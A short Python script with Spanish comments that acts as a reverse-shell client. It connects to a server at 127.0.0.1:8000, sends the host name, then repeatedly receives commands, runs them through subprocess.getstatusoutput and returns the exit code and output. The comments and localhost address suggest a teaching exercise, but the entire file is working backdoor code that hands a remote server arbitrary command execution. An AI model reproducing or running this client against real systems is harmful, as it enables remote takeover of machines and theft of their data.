from socket import socket
from platform import *
from subprocess import getstatusoutput
from time import sleep
try:


    s = socket() #Crear una instancia socket
    s.connect(("127.0.0.1", 8000)) # se conecta al server por 127.0.0.1:8000
    
    s.send("Cliente conectado: {}".format(node()).encode()) # envio un objeto bytes al cliente

    while True: #Bucle while que se repite infinitamente
        size_output_command = int(s.recv(1024).decode()) #Recibimos la longitud del comando y lo guardamos en la variable
        
        comando = s.recv(1024).decode() #Recibimos el comando y lo guardamos en la variable
        
        s.send("True".encode()) #Enviamos al servidor un "True" indicando que el cliente tiene la informacion
        
        sleep(0.5) #Espera 0,5 segundos
        if size_output_command >= 0: #Si la longitud del comando es mayor o igual que 0:
             salida_comando = getstatusoutput(comando) #Ejecuta el comando y lo guarda en la variable
             s.send(str(salida_comando[0]).encode()) #Mandamos al servidor la posicion 1 de la lista de salida de comando (0 o 1)
             sleep(0.5) #Espera 0,5 segundos 
             s.send(salida_comando[1].encode())  #Mandamos al servidor la posicion 2 de la lista de salida del comando (Ahora la salida del comando)
        else:
            s.send(str(1).encode()) #Manda un "1" al servidor
        sleep(0.5) #Espera 0,5 segundos
             

    s.close() # cierra el socket
except KeyboardInterrupt:
    print("Saliendo del programa...")
